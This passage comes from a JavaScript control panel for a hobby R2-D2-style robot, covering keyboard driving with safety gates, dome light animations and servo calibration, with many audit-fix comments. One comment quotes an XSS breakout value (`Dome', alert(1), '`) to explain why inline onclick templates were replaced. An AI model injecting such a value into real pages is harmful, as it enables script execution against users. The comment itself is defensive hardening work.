  // Audit finding Joystick L-1 2026-05-15: also skip contenteditable
  // elements (none on Drive today, but the choreo editor uses them
  // for inline label edit). Future-proofing.
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') return;
  if (e.target.isContentEditable) return;
  // VESC test mode captures keys when active
  if (vescTest.onKey(e.code, true)) return;
  // Audit finding Drive UX H-3 2026-05-15: don't accumulate _keys[]
  // state outside the Drive tab. Switching to Settings/Audio with a
  // key held then switching back used to surface the stale held-state
  // until the next real keydown. Now: drop the event before it ever
  // mutates _keys. The choreo editor's own keydown handler (Space /
  // arrows for nudge) runs separately on its own tab.
  if (document.querySelector('.tab.active')?.dataset.tab !== 'drive') return;
  // W25 fix 2026-05-16: 'L' key on Drive tab = emergency Child Lock
  // (instant lock when handing tablet to a kid). No modifier needed
  // since Drive tab doesn't use 'L' for anything else. Power-user
  // shortcut — discoverable via tooltip on #drive-lock-btn.
  if (e.code === 'KeyL' && !e.ctrlKey && !e.altKey && !e.metaKey) {
    if (typeof lockMgr !== 'undefined' && lockMgr._mode === 0) {
      lockMgr._applyMode(2);   // direct jump to Child Lock
      return;
    }
  }
  if (_keys[e.code]) return;
  _keys[e.code] = true;
  _updateKbdUI();
  _handleKeys();
});

document.addEventListener('keyup', e => {
  if (vescTest.onKey(e.code, false)) return;
  // Always allow keyup to clear stale state — even if user switched
  // tabs mid-press, the prior keydown may have set _keys[] when the
  // Drive tab was active. Letting keyup clear it always is safe.
  delete _keys[e.code];
  _updateKbdUI();
  _handleKeys();
});

function _updateKbdUI() {
  ['kbd-w','kbd-s','kbd-a','kbd-d','kbd-up','kbd-down','kbd-left','kbd-right'].forEach(id => {
    const k = el(id);
    if (k) k.classList.remove('active');
  });
  Object.keys(_keys).forEach(code => {
    const id = KBD_IDS[code];
    if (id) { const k = el(id); if (k) k.classList.add('active'); }
  });
}

let _domeKeyWasActive = false;
let _propKeyWasActive = false;

function _handleKeys() {
  if (_leftActive) return; // joystick takes priority
  // F-2: refuse keyboard motion during E-STOP. Mirrors the joystick onMove
  // gate — without this, holding W while the user clicks the on-screen
  // E-STOP would keep posting /motion/arcade (server refuses 403 'estop'
  // but we still spam logs + network).
  if (_estopTripped) {
    if (_propKeyWasActive) { _propKeyWasActive = false; driveStop(); _updateDriveHUD(0, 0); }
    if (_domeKeyWasActive) { _domeKeyWasActive = false; domeStop(); }
    return;
  }
  // Per-axis choreo lockout. Block WASD only when the choreo owns
  // propulsion; block ←/→ only when it owns dome. A panel-only
  // choreo doesn't reach this branch at all (both flags false).
  if (_choreoPropLocked && _propKeyWasActive) {
    _propKeyWasActive = false; driveStop(); _updateDriveHUD(0, 0);
  }
  if (_choreoDomeLocked && _domeKeyWasActive) {
    _domeKeyWasActive = false; domeStop();
  }
  // User-reported 2026-05-15: WASD used to drive the motors regardless
  // of which tab was active. Operator typing into Settings → VESC was
  // surprised to see the duty meter spike on their first W keypress.
  // Now: WASD propulsion is only honored on the Drive tab. VESC Test
  // Mode (Settings → VESC → Drive Test Mode ENABLE) has its own
  // keyboard pipeline via vescTest.onKey() — that path is called
  // BEFORE this function in the keydown handler, so when test mode
  // is on the keys are captured there and never reach here. So the
  // gate is: only act when the Drive tab is the active tab. Any
  // in-flight propulsion gets stopped when the user switches off the
  // Drive tab while a key is held.
  const onDriveTab = document.querySelector('.tab.active')?.dataset.tab === 'drive';
  if (!onDriveTab) {
    if (_propKeyWasActive) { _propKeyWasActive = false; driveStop(); _updateDriveHUD(0, 0); }
    if (_domeKeyWasActive) { _domeKeyWasActive = false; domeStop(); }
    return;
  }

  // Propulsion — WASD only
  const fwd   = _keys['KeyW'];
  const back  = _keys['KeyS'];
  const left  = _keys['KeyA'];
  const right = _keys['KeyD'];

  if (fwd || back || left || right) {
    // F-15: refuse WASD propulsion when VESC safety blocks the drive.
    // Without this, holding W with an offline VESC kept POSTing arcade
    // calls (server refuses 503 but client spammed). Stop any in-flight
    // motion first so a release-of-W doesn't fire an extra driveStop.
    if (!_vescDriveSafe || lockMgr.isDriveLocked() || _choreoPropLocked) {
      if (_propKeyWasActive) { _propKeyWasActive = false; driveStop(); _updateDriveHUD(0, 0); }
    } else {
      _propKeyWasActive = true;
      const throttle = (fwd ? 1 : back  ? -1 : 0) * _speedLimit;
      const steering = (right ? 1 : left ? -1 : 0) * _speedLimit * 0.5;
      _postMotion('/motion/arcade', { throttle, steering });
      _updateDriveHUD(throttle, steering);
    }
  } else if (_propKeyWasActive) {
    _propKeyWasActive = false;
    driveStop();
    _updateDriveHUD(0, 0);
  }

  // Dome rotation — Arrow Left / Right
  // Arrow Up / Down reserved for future camera tilt
  const domeL = _keys['ArrowLeft'];
  const domeR = _keys['ArrowRight'];
  if (domeL || domeR) {
    if (_choreoDomeLocked) {
      if (_domeKeyWasActive) { _domeKeyWasActive = false; domeStop(); }
    } else {
      _domeKeyWasActive = true;
      _postMotion('/motion/dome/turn', { speed: domeR ? 0.4 : -0.4 });
    }
  } else if (_domeKeyWasActive) {
    _domeKeyWasActive = false;
    domeStop();
  }
}

// ================================================================
// Teeces Controller
// ================================================================

class TeecesController {
  constructor() {
    this._currentMode = 'random';
    this._currentAnim = null;   // last animation T-code, for chip re-sync
    // B3 fix 2026-05-16: removed _initFLD()/_initPSI()/_applyFLDMode() —
    // they targeted DOM IDs (fld-row-0/1/2, fld-preview, psi-swatches,
    // psi-left, psi-right) that no longer exist. All the if (!el) continue
    // guards no-op'd silently for months; the only side-effect was a
    // latent XSS in the swatch innerHTML template if someone ever
    // re-added those IDs.
  }

  setMode(mode) {
    this._currentMode = mode;
    this._currentAnim = null;
    // W3 fix 2026-05-16: withSaveFeedback on the RANDOM/OFF buttons
    // so the operator gets a spinner + Saved ✓ instead of silent wait.
    const btn = el(`teeces-btn-${mode}`);
    const send = () => api(`/teeces/${mode}`, 'POST').then(d => {
      if (d) toast(`Teeces: ${mode.toUpperCase()}`, 'ok');
      return d;
    });
    if (btn && typeof withSaveFeedback === 'function') {
      withSaveFeedback(btn, send);
    } else {
      send();
    }
    document.querySelectorAll('[id^="teeces-btn-"]').forEach(b => b.classList.remove('btn-active'));
    if (btn) btn.classList.add('btn-active');
    document.querySelectorAll('.anim-chip').forEach(b => b.classList.remove('active'));
    _domeSim.setMode(mode);
  }

  sendText(text, display = 'fld_top') {
    if (!text) return;
    // W3 fix 2026-05-16: SEND button feedback (was silent ~150-300ms wait)
    // 2026-05-16 update: endpoint is now LAN-open (admin gate dropped),
    // so the previous 'check admin lock' toast is gone. A null response
    // now actually means the request truly failed (network/server).
    const btn = document.querySelector('#tab-lights .row.mt button.btn');
    const send = () => api('/teeces/text', 'POST', { text, display }).then(d => {
      if (d) {
        // B10 fix 2026-05-16: use server-sanitized text in the toast.
        toast(`${display.toUpperCase().replace('_',' ')}: "${d.text || text}"`, 'ok');
      } else {
        toast('SEND failed — network or server error', 'error');
      }
      return d;
    });
    if (btn && typeof withSaveFeedback === 'function') {
      withSaveFeedback(btn, send);
    } else {
      send();
    }
  }

  /** B4/B5/E3 + W1/W2 fix 2026-05-16: sync UI from /status data.
   *  Backend now exposes data.teeces_mode (string: 'random'|'off'|'leia'|
   *  'text'|'animation:N'). Frontend re-derives chip + button state every
   *  poll so UI never lies after reload / cross-device / choreo bypass. */
  syncFromStatus(mode) {
    if (!mode || mode === this._currentMode) {
      // Anim sub-state can change even when mode string is same
      if (mode === 'animation' || (mode && mode.startsWith('animation:'))) {
        this._syncAnimChip(mode);
      }
      return;
    }
    this._currentMode = mode;
    // Top buttons (RANDOM/OFF) — strip all then re-add if applicable
    document.querySelectorAll('[id^="teeces-btn-"]').forEach(b => b.classList.remove('btn-active'));
    if (mode === 'random' || mode === 'off') {
      el(`teeces-btn-${mode}`)?.classList.add('btn-active');
      document.querySelectorAll('.anim-chip').forEach(b => b.classList.remove('active'));
      this._currentAnim = null;
    }
    // Animation chips
    if (mode === 'animation' || (mode && mode.startsWith('animation:'))) {
      this._syncAnimChip(mode);
    } else {
      document.querySelectorAll('.anim-chip').forEach(b => b.classList.remove('active'));
    }
    // Mode badge
    if (_domeSim && _domeSim.setMode) _domeSim.setMode(
      mode === 'leia' ? 'leia' :
      mode === 'off'  ? 'off'  :
      mode === 'text' ? 'text' :
      (mode && mode.startsWith('animation:')) ? 'random' :
      'random'
    );
  }

  _syncAnimChip(mode) {
    const num = (mode && mode.startsWith('animation:'))
      ? parseInt(mode.slice('animation:'.length), 10)
      : null;
    if (num === this._currentAnim) return;
    this._currentAnim = num;
    document.querySelectorAll('.anim-chip').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('[id^="teeces-btn-"]').forEach(b => b.classList.remove('btn-active'));
    if (num) el(`anim-btn-${num}`)?.classList.add('active');
  }

  updateCardTitle(backend) {
    const title = el('lights-card-title');
    if (!title) return;
    // W12 fix 2026-05-16: title is preserved (just "LIGHTS CONTROL") +
    // a pill child carries the backend label/color. Was: title text
    // hot-swapped which clobbered the pill at every poll.
    const labelNode = title.childNodes[0];
    if (labelNode) labelNode.nodeValue = 'LIGHTS CONTROL ';
  }

  /** W12 fix 2026-05-16: backend pill visible next to title with
   *  per-backend color (teeces blue / astropixels cyan / unknown grey).
   *  Was: backend only encoded in card title text. */
  updateBackendPill(backend) {
    const pill = el('lights-backend-pill');
    if (!pill) return;
    const LABELS = { teeces: 'TEECES', astropixels: 'ASTROPIXELS+', none: '— OFFLINE' };
    pill.textContent = LABELS[backend] || backend.toUpperCase();
    pill.className = 'backend-pill backend-' + backend;
  }

  setPSI(modeNum) {
    api('/teeces/psi', 'POST', { mode: modeNum }).then(d => {
      if (d) toast(`PSI mode ${modeNum}`, 'ok');
    });
    const PSI_COLORS = ['#ff2244','#ff8800','#ffee00','#00cc66','#00aaff','#8844ff','#ff44aa','#ffffff'];
    const color = PSI_COLORS[modeNum - 1] || '#00aaff';
    _domeSim.updatePSI(color);
  }
}

const teecesController = new TeecesController();

// E4 fix 2026-05-16: client-side debounce on lights mutation paths.
// pyserial has no atomic write guarantee for >1 byte payloads (server
// added threading.Lock in E2 batch 1, but two POSTs arriving 5ms
// apart still produce two distinct UART writes). Spam-clicks just
// thrash the firmware buffer — drop dup calls within 250ms.
const _lightsDebounce = { last: {}, MIN_MS: 250 };
function _lightsThrottled(key) {
  const now = Date.now();
  if (now - (_lightsDebounce.last[key] || 0) < _lightsDebounce.MIN_MS) return true;
  _lightsDebounce.last[key] = now;
  return false;
}

function teecesMode(mode)  {
  if (_lightsThrottled('mode:' + mode)) return;
  teecesController.setMode(mode);
}
function sendTeecesText() {
  const text    = el('teeces-text')?.value.trim() || '';
  const display = el('teeces-display')?.value || 'fld_top';
  // W6 fix 2026-05-16: empty SEND = explicit toast warn (was silent
  // no-op — operator unsure if click registered).
  if (!text) {
    toast('Type a message first', 'warn');
    el('teeces-text')?.focus();
    return;
  }
  teecesController.sendText(text, display);
  _domeSim.setText(display, text);
}

// W6 fix 2026-05-16: live char counter — amber at ≥18, red at 20.
function updateTextCounter() {
  const input = el('teeces-text');
  const counter = el('teeces-text-counter');
  if (!input || !counter) return;
  const len = input.value.length;
  counter.textContent = `${len}/20`;
  counter.classList.toggle('text-counter-warn', len >= 18 && len < 20);
  counter.classList.toggle('text-counter-max',  len >= 20);
}

// PRESETS reverted 2026-05-16: redundant with ANIMATIONS grid + PSI
// controls already present on the same tab. User feedback: 'I don't
// understand what it does there — we already have animations next to
// it'. The combo (anim + PSI) is 2 explicit clicks via the existing
// controls — not worth a duplicate UI section.

const LIGHT_ANIMATIONS = [
  { mode:  1, label: 'Random',           icon: '✨', dur: '∞' },
  { mode:  2, label: 'Flash',            icon: '⚡', dur: '4s' },
  { mode:  3, label: 'Alarm',            icon: '🚨', dur: '4s' },
  { mode:  4, label: 'Short Circuit',    icon: '💥', dur: '10s' },
  { mode:  5, label: 'Scream',           icon: '😱', dur: '4s' },
  { mode:  6, label: 'Leia',             icon: '🌀', dur: '34s' },
  { mode:  7, label: 'I ♥ U',           icon: '❤️', dur: '10s' },
  { mode:  8, label: 'Panel Sweep',      icon: '↔️', dur: '7s' },
  { mode:  9, label: 'Pulse Monitor',    icon: '💓', dur: '∞' },
  { mode: 10, label: 'Star Wars Scroll', icon: '⭐', dur: '15s' },
  { mode: 11, label: 'Imperial March',   icon: '🎵', dur: '47s' },
  { mode: 12, label: 'Disco (timed)',    icon: '🪩', dur: '4s' },
  { mode: 13, label: 'Disco',            icon: '🪩', dur: '∞' },
  { mode: 14, label: 'Rebel Symbol',     icon: '✊', dur: '5s' },
  { mode: 15, label: 'Knight Rider',     icon: '🚗', dur: '20s' },
  { mode: 16, label: 'Test White',       icon: '⬜', dur: '∞' },
  { mode: 17, label: 'Red On',           icon: '🔴', dur: '∞' },
  { mode: 18, label: 'Green On',         icon: '🟢', dur: '∞' },
  { mode: 19, label: 'Lightsaber',       icon: '⚔️', dur: '∞' },
  { mode: 20, label: 'Off',              icon: '⬛', dur: '—' },
  { mode: 21, label: 'VU Meter (timed)', icon: '📊', dur: '4s' },
  { mode: 92, label: 'VU Meter',         icon: '📊', dur: '∞' },
];

// E1 fix 2026-05-16: cache animData + grid build state. Animations
// list is server-static (BaseLightsController.ANIMATIONS dict), so
// re-fetching on every tab switch was waste. Cache survives the
// session; switching backend in Settings invalidates via reload.
let _lightsAnimDataCache = null;

async function loadLightSequences() {
  let [seqData, animData, state] = await Promise.all([
    api('/light/list'),
    _lightsAnimDataCache ? Promise.resolve(_lightsAnimDataCache) : api('/teeces/animations'),
    api('/teeces/state'),
  ]);
  // 2026-05-16: defense-in-depth — if the cached animData's backend
  // doesn't match the active state.backend (e.g. someone edited
  // local.cfg by hand), force a refetch so the grid matches the
  // current driver's supported T-codes.
  if (_lightsAnimDataCache && state?.backend && animData?.backend
      && animData.backend !== state.backend) {
    _lightsAnimDataCache = null;
    animData = await api('/teeces/animations');
  }
  if (!_lightsAnimDataCache && animData) _lightsAnimDataCache = animData;

  // Initialize dome simulation (idempotent)
  _domeSim.init();

  // Animations grid — colored chips
  const CHIP_COLORS = {
    1:'c-blue',2:'c-yellow',3:'c-red',4:'c-orange',5:'c-cyan',6:'c-purple',7:'c-pink',
    8:'c-blue',9:'c-green',10:'c-gold',11:'c-orange',12:'c-pink',13:'c-pink',
    14:'c-red',15:'c-orange',16:'c-white',17:'c-red',18:'c-green',19:'c-lsaber',
    20:'c-dim',21:'c-green',92:'c-green',
  };
  const animGrid = el('anim-grid');
  // E1 fix 2026-05-16: skip rebuild if grid already populated. Was
  // destroying + recreating all chips on every tab visit → flicker +
  // lost hover/long-press state. Only rebuild on first visit OR if
  // chip count differs (backend switch invalidates).
  const needRebuild = animGrid && animData?.animations
    && animGrid.children.length !== animData.animations.length;
  if (animGrid && animData?.animations && needRebuild) {
    // W5 fix 2026-05-16: native title tooltip with duration + mode#
    // — was: bare chip, operator pressed "Leia" not knowing it's 34s.
    // Tooltip is desktop hover + touch long-press (mobile parity).
    animGrid.innerHTML = animData.animations.map(a => {
      const meta = LIGHT_ANIMATIONS.find(x => x.mode === a.mode);
      const icon = meta ? meta.icon : '';
      const label = (meta ? meta.label : a.name).toUpperCase();
      const dur   = meta ? meta.dur : '';
      const cc = CHIP_COLORS[a.mode] || 'c-blue';
      const title = `${meta ? meta.label : a.name} • T${a.mode}${dur ? ' • ' + dur : ''}`;
      return `<button class="anim-chip ${cc}" id="anim-btn-${a.mode}"
              onclick="playAnimation(${a.mode})" title="${title}">${icon ? icon + ' ' : ''}${label}<span class="anim-chip-dur">${dur}</span></button>`;
    }).join('');
  }

  // Update global backend + raw palette label
  if (state?.backend) {
    _lightsBackend = state.backend;
    _updateRawPaletteItem();
  }

  // Backend title + W12 fix: sync backend pill
  if (state?.backend) {
    teecesController.updateCardTitle(state.backend);
    teecesController.updateBackendPill(state.backend);
  }
  // W9 fix 2026-05-16: restore last-played anim marker (per-robot).
  const lastAnim = _lsGet('astromech-last-anim');
  if (lastAnim) {
    document.querySelectorAll('.anim-chip.last-played').forEach(b => b.classList.remove('last-played'));
    const lastBtn = el(`anim-btn-${lastAnim}`);
    if (lastBtn) lastBtn.classList.add('last-played');
  }
  // Reset counter to current input length (covers re-visit case)
  updateTextCounter();
}

function playAnimation(mode) {
  // E4 fix 2026-05-16: debounce against double-click race on same mode
  if (_lightsThrottled('anim:' + mode)) return;
  // W9 fix 2026-05-16: persist last-played marker (per-robot via
  // _lsKey helpers). Parité Audio/Sequences. Restored on grid render
  // (see loadLightSequences last-played decoration block).
  _lsSet('astromech-last-anim', String(mode));
  api('/teeces/animation', 'POST', { mode }).then(d => {
    if (d) {
      _domeSim.setModeNum(mode);
      document.querySelectorAll('.anim-chip').forEach(b => b.classList.remove('active'));
      const btn = el(`anim-btn-${mode}`);
      if (btn) btn.classList.add('active');
      toast(d.name ? d.name.toUpperCase() : `Anim ${mode}`, 'ok');
    }
  });
}


// ================================================================
// Servo Panel
// ================================================================

class ServoPanel {
  constructor(gridId, servos, apiPrefix) {
    this._gridId    = gridId;
    this._servos    = servos;
    this._apiPrefix = apiPrefix;  // e.g. '/servo/dome' or '/servo/body'
    this._state     = {};
    this._servos.forEach(n => this._state[n] = 'close');
    // B4 fix 2026-05-16: track dirty fields so updateInputs() AFTER a
    // save (or periodic reload) doesn't wipe values the operator is
    // still typing in OTHER HATs. Also basis for P1 diff-aware save.
    // Set of `${name}.${field}` strings (e.g. 'Servo_M0.label').
    this._dirtyFields = new Set();
    // E4 fix 2026-05-16: per-servo test debounce to block UART burst
    // from spam-click. Maps name → timestamp of last test command.
    this._lastTest = {};
    this.render();
  }

  render() {
    const grid = el(this._gridId);
    if (!grid) return;
    // B-201 / B-202 (remaining tabs audit 2026-05-15): build rows via
    // DOM primitives. The previous innerHTML template interpolated
    // `panel.label` INSIDE the `value=` attribute and `${name}` inside
    // an inline single-quoted `onclick="open('${name}')"`. escapeHtml
    // does NOT escape `'` — a label or servo id containing a quote
    // would break out. Legacy or out-of-band edited servo_angles.json
    // (gitignored on the Pi) can hold any string. textContent for
    // labels + addEventListener for click handlers eliminates both
    // sinks. Servo names are server-allowlisted (`Servo_[DMS]\\d+`) but
    // belt-and-suspenders is the policy after Sequences XSS audit.
    grid.replaceChildren();
    this._servos.forEach(name => {
      const panel = (_servoCfg.panels || {})[name] || { label: name, open: 110, close: 20, speed: 10 };
      const row = document.createElement('div');
      row.className = 'servo-row';
      row.id = 'servo-row-' + name;

      const nameSpan = document.createElement('span');
      nameSpan.className = 'servo-name';
      nameSpan.textContent = name;
      row.appendChild(nameSpan);

      const lblIn = document.createElement('input');
      lblIn.type = 'text';
      lblIn.id = 'sc-label-' + name;
      lblIn.className = 'servo-label-in';
      lblIn.value = panel.label || name;   // setter is attr-safe (no HTML parse)
      lblIn.placeholder = 'Label';
      lblIn.maxLength = 32;
      // B4 fix: mark dirty on first user edit so updateInputs preserves it.
      lblIn.addEventListener('input', () => this._dirtyFields.add(name + '.label'));
      row.appendChild(lblIn);

      const calibWrap = document.createElement('div');
      calibWrap.className = 'servo-calib-wrap';
      const mkAngleField = (letter, idSuffix, min, max, val, fieldKey) => {
        const lab = document.createElement('label');
        lab.className = 'servo-calib-label';
        lab.appendChild(document.createTextNode(letter));
        const inp = document.createElement('input');
        inp.type = 'number';
        inp.id = idSuffix + name;
        inp.className = 'servo-angle-in';
        inp.min = String(min);
        inp.max = String(max);
        inp.value = String(val);
        // B4 fix: mark this servo+field dirty on first user edit.
        inp.addEventListener('input', () => this._dirtyFields.add(name + '.' + fieldKey));
        lab.appendChild(inp);
        return lab;
      };
      calibWrap.appendChild(mkAngleField('O', 'sc-open-',  10, 170, panel.open,        'open'));
      calibWrap.appendChild(mkAngleField('C', 'sc-close-', 10, 170, panel.close,       'close'));
      calibWrap.appendChild(mkAngleField('S', 'sc-speed-',  1,  10, panel.speed ?? 10, 'speed'));
      row.appendChild(calibWrap);

      const openBtn = document.createElement('button');
      openBtn.className = 'btn btn-xs';
      openBtn.textContent = 'OPEN';
      openBtn.addEventListener('click', () => this.open(name));
      row.appendChild(openBtn);

      const closeBtn = document.createElement('button');
      closeBtn.className = 'btn btn-xs btn-dark';
      closeBtn.textContent = 'CLOSE';
      closeBtn.addEventListener('click', () => this.close(name));
      row.appendChild(closeBtn);

      grid.appendChild(row);
    });
  }

  updateInputs() {
    // B4 fix 2026-05-16: SKIP overwriting any field the operator has
    // edited but not yet saved. Previous behaviour clobbered every
    // input on every poll/save, which wiped HAT2's typing while HAT1
    // saved. Dirty bits are cleared on saveAngles() success.
    this._servos.forEach(name => {
      const panel = (_servoCfg.panels || {})[name];
      if (!panel) return;
      const dirty = this._dirtyFields;
      const lEl = el(`sc-label-${name}`);
      const oEl = el(`sc-open-${name}`);
      const cEl = el(`sc-close-${name}`);
      const sEl = el(`sc-speed-${name}`);
      if (lEl && !dirty.has(name + '.label')) lEl.value = panel.label || name;
      if (oEl && !dirty.has(name + '.open'))  oEl.value = panel.open;
      if (cEl && !dirty.has(name + '.close')) cEl.value = panel.close;
      if (sEl && !dirty.has(name + '.speed')) sEl.value = panel.speed ?? 10;
    });
  }

  _getVar() {
    return `_hatPanels['${this._gridId}']`;
  }

  // E4/B7 fix 2026-05-16: per-servo test throttle. Spam-clicking OPEN
  // burst-queued POSTs → slave UART congestion → could starve heartbeat
  // 200ms cadence. Cooldown = expected ramp duration so the operator
  // can't fire a new command until the previous one is reasonably done.
  _testThrottled(name, speed) {
    const now = Date.now();
    // Rough ramp time at this speed for 90° = (10-speed)*3ms × 45 steps
    const rampMs = (10 - Math.max(1, Math.min(10, speed))) * 3 * 45 + 50;
    if (now - (this._lastTest[name] || 0) < rampMs) return true;
    this._lastTest[name] = now;
    return false;
  }

  open(name) {
    const label = el(`sc-label-${name}`)?.value || name;
    const speed = parseInt(el(`sc-speed-${name}`)?.value) || 10;
    if (this._testThrottled(name, speed)) return;
    // WOW polish H2 2026-05-15: animate the fill bar over the actual
    // slew duration instead of jumping to 100% instantly.
    // 2026-05-16 user-reported: switch to apiDetail so 403/503 surface
    // the actual reason (E-STOP, stow, choreo) instead of silent fail.
    const cur   = this._state[name] === 'open' ? 100 : 0;
    apiDetail(`${this._apiPrefix}/open`, 'POST', { name }).then(res => {
      if (res.ok) {
        toast(`${label}: OPEN`, 'ok');
        this._animateFill(name, cur, 100, speed);
        this._state[name] = 'open';
      } else {
        toast(res.error || `${label}: OPEN refused`, 'error');
      }
    });
  }

  close(name) {
    const label = el(`sc-label-${name}`)?.value || name;
    const speed = parseInt(el(`sc-speed-${name}`)?.value) || 10;
    if (this._testThrottled(name, speed)) return;
    const cur   = this._state[name] === 'open' ? 100 : 0;
    apiDetail(`${this._apiPrefix}/close`, 'POST', { name }).then(res => {
      if (res.ok) {
        toast(`${label}: CLOSE`, 'ok');
        this._animateFill(name, cur, 0, speed);
        this._state[name] = 'close';
      } else {
        toast(res.error || `${label}: CLOSE refused`, 'error');
      }
    });
  }

  async saveAngles() {
    // P1 fix 2026-05-16: only send servos that were actually edited
    // (dirty set). Previously sent all 16 servos in the HAT every time
    // → 16-row JSON RMW + SCP push for one knob change.
    // Now: empty dirty set → no-op; non-empty → subset of changed servos.
    const panels = {};
    const editedNames = new Set();
    this._dirtyFields.forEach(key => {
      const name = key.split('.')[0];
      if (this._servos.includes(name)) editedNames.add(name);
    });
    if (editedNames.size === 0) {
      toast('No changes to save', 'info');
      return;
    }
    editedNames.forEach(name => {
      const lEl = el(`sc-label-${name}`);
      const oEl = el(`sc-open-${name}`);
      const cEl = el(`sc-close-${name}`);
      const sEl = el(`sc-speed-${name}`);
      if (oEl && cEl) {
        panels[name] = {
          label: lEl?.value.trim() || name,
          open:  parseInt(oEl.value) || 110,
          close: parseInt(cEl.value) || 20,
          speed: parseInt(sEl?.value) || 10,
        };
      }
    });
    // E1 fix 2026-05-16: optimistic concurrency token via If-Match
    // header — server compares to current file mtime, returns 409 on
    // mismatch. Falls back to no-header (legacy behavior) if version
    // wasn't captured.
    const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
    const headers = { 'Content-Type': 'application/json' };
    if (typeof adminGuard !== 'undefined') {
      const tok = adminGuard.getToken && adminGuard.getToken();
      if (tok) headers['X-Admin-Pw'] = tok;
    }
    if (_servoCfgVersion) headers['If-Match'] = _servoCfgVersion;
    let res;
    try {
      res = await fetch(base + '/servo/settings', {
        method: 'POST', headers, body: JSON.stringify({ panels }),
      });
    } catch (e) {
      toast('Network error — save failed', 'error');
      return;
    }
    if (res.status === 409) {
      toast('Another admin changed servo settings — refreshing', 'warn');
      _servoCfgVersion = null;
      await loadServoSettings();
      return;
    }
    if (!res.ok) {
      let err = 'Save failed';
      try { err = (await res.json()).error || err; } catch {}
      toast(err, 'error');
      return;
    }
    const data = await res.json().catch(() => null);
    if (!data) { toast('Save response malformed', 'error'); return; }
    _servoCfg = data;
    // Capture new version for next If-Match
    _servoCfgVersion = res.headers.get('X-Servo-Version') || _servoCfgVersion;
    // Clear dirty bits — server state now matches user input
    editedNames.forEach(name => {
      this._dirtyFields.delete(name + '.label');
      this._dirtyFields.delete(name + '.open');
      this._dirtyFields.delete(name + '.close');
      this._dirtyFields.delete(name + '.speed');
    });
    // Propagate any server-side label sanitization to other HATs
    Object.values(_hatPanels).forEach(p => p.updateInputs());
    toast(`Saved ${editedNames.size} servo${editedNames.size === 1 ? '' : 's'}`, 'ok');
    // E10 fix 2026-05-16: if any body servo was in the save, poll the
    // sync_status endpoint ~1.5s later to verify the Slave actually got
    // the SCP push. Was: silent success in UI even when SCP failed →
    // operator drove the robot with stale Slave angles.
    const editedBody = [...editedNames].some(n => /^Servo_S\d+$/.test(n));
    if (editedBody) {
      setTimeout(async () => {
        const sync = await api('/servo/sync_status').catch(() => null);
        if (sync && sync.attempted && !sync.ok && sync.error !== 'running') {
          toast(`Slave sync failed: ${sync.error}. Body angles may be stale on Slave.`, 'warn');
        }
      }, 1500);
    }
  }

  _setFill(name, pct) {
    const f = el(`servo-fill-${name}`);
    if (f) f.style.width = pct + '%';
  }

  // WOW polish H2 2026-05-15: animate fill matching physical slew.
  // Backend formula: step=2°, delay=(10-speed)*3ms per step.
  // 90° travel × speed=3 ≈ 945ms; × speed=10 ≈ ~135ms.
  _animateFill(name, from, to, speed) {
    const f = el(`servo-fill-${name}`);
    if (!f) return;
    const stepCount = Math.max(1, Math.abs(45));   // ~90°/2°
    const perStep   = Math.max(1, (10 - Math.max(1, Math.min(10, speed))) * 3);
    const totalMs   = stepCount * perStep;
    f.style.transition = `width ${totalMs}ms linear`;
    f.style.width = to + '%';
    setTimeout(() => { if (f) f.style.transition = ''; }, totalMs + 50);
  }
}

// Servo calibration config (loaded from /servo/settings at init)
let _servoCfg = { panels: {}, dome_hats: [], body_hats: [] };
let _masterLocation = 'Dome';
let _slaveLocation  = 'Body';

// HAT ServoPanel registry — keyed by grid div id
const _hatPanels = {};

function _renderHatBlocks(container, hats, apiPrefix, side) {
  if (!container) return;
  // B-202 (remaining tabs audit 2026-05-15): build sections via DOM
  // primitives. The previous innerHTML template interpolated `label`
  // (which contains user-controlled `_masterLocation` / `_slaveLocation`
  // from /settings/robot_locations) INSIDE single-quoted inline
  // onclicks: `onclick="...toast('${label} open','ok')"`. escapeHtml
  // doesn't escape `'`, so a location of `Dome', alert(1), '` would
  // break out. createElement + textContent + addEventListener cleans
  // up both the title and the button handlers.
  container.replaceChildren();
  hats.forEach(hat => {
    const gridId  = `${side}-servo-hat${hat.hat}-list`;
    const loc   = (side === 'dome' ? _masterLocation : _slaveLocation).toUpperCase();
    const label = hats.length > 1 ? `${loc} SERVOS ${hat.hat} (${hat.addr})` : `${loc} SERVOS`;
    const section = document.createElement('section');
    section.className = 'card systems-card';

    const title = document.createElement('h2');
    title.className = 'card-title';
    title.textContent = label;
    section.appendChild(title);

    const note = document.createElement('div');
    note.className = 'settings-note';
    note.style.marginBottom = '6px';
    note.textContent = 'O° = open  |  C° = close  |  S = speed (1=slow…10=instant)';
    section.appendChild(note);

    const grid = document.createElement('div');
    grid.className = 'servo-grid';
    grid.id = gridId;
    section.appendChild(grid);

    const btnRow = document.createElement('div');
    btnRow.className = 'row mt';
    const openAllBtn = document.createElement('button');
    openAllBtn.className = 'btn btn-active';
    openAllBtn.textContent = 'OPEN ALL';
    openAllBtn.addEventListener('click', () => {
      // User-reported 2026-05-16: was using api().then(() => toast OK)
      // which fired the green toast even on 403 (E-STOP) — operator
      // saw success while nothing physically moved. apiDetail surfaces
      // backend error messages so the toast tells the actual reason.
      apiDetail(`/servo/${side}/open_all`, 'POST').then(res => {
        if (res.ok) toast(`${label} open`, 'ok');
        else        toast(res.error || `${label} open refused`, 'error');
      });
    });
    const closeAllBtn = document.createElement('button');
    closeAllBtn.className = 'btn btn-dark';
    closeAllBtn.textContent = 'CLOSE ALL';
    closeAllBtn.addEventListener('click', () => {
      apiDetail(`/servo/${side}/close_all`, 'POST').then(res => {
        if (res.ok) toast(`${label} closed`, 'ok');
        else        toast(res.error || `${label} close refused`, 'error');
      });
    });
    const saveBtn = document.createElement('button');
    saveBtn.className = 'btn';
    saveBtn.textContent = 'SAVE CONFIG';
    saveBtn.addEventListener('click', () => {
      const panel = _hatPanels[gridId];
      if (panel) panel.saveAngles();
    });
    btnRow.append(openAllBtn, closeAllBtn, saveBtn);
    section.appendChild(btnRow);

    container.appendChild(section);
    _hatPanels[gridId] = new ServoPanel(gridId, hat.servos, `/servo/${side}`);
  });
}

function renderCalibration() {
  const domeHats = _servoCfg.dome_hats?.length
    ? _servoCfg.dome_hats
    : [{ hat: 1, addr: '0x40', servos: Array.from({length:16}, (_, i) => `Servo_M${i}`) }];
